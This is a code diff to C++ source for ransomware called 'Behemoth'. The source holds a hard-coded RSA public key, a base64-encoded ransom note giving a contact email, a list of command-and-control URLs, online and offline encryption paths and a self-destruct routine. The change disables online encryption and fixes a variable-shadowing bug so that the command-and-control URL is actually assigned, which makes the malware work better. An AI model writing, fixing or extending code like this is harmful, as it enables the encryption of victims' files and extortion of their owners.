@@ -30,7 +30,7 @@
 std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
 std::string README = "WW91ciBmaWxlcyBoYXMgYmVlbiBlbmNyeXB0ZWQgd2l0aCBCZWhlbW90aCByYW5zb213YXJlLgoKVGhlIGZpbGUgaGFzaCBmb3IgdGhpcyBleGVjdXRhYmxlIGlzIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgKCkNvbnN0YW50IHVzIGF0IGNvbnN0YW50QGMwbnN0YW50LmNhIHdpdGggdGhlIGV4ZWN1dGFibGUncyBoYXNoIHRvIGRlY3J5cHQgeW91ciBmaWxlcy4KCg==";
 
-bool ONLINE_ENC = true;
+bool ONLINE_ENC = false;
 std::wstring C2_URL = L"";                /// populate this with if statements inside main
 std::vector<std::wstring> URLS = {
         L"http://10.0.0.140/",
@@ -47,7 +47,7 @@ int main() {
         // check connection with google
         if (googleConn()) {
             // if connection google succeeded, check connection with C2 URLs and retrieve a valid c2 URL
-            std::wstring C2_URL = c2_conn(URLS) + L"new-user";
+            C2_URL = c2_conn(URLS) + L"new-user";
             // if no live C2 is found, begin offline encryption:
             if (C2_URL.empty()) {
                 encryption(false);
@@ -63,7 +63,6 @@ int main() {
         // if offline encryption: begin offline encryption & use hard-coded key and readme
         encryption(false);
     }
-    
 
     self_destruct();
 
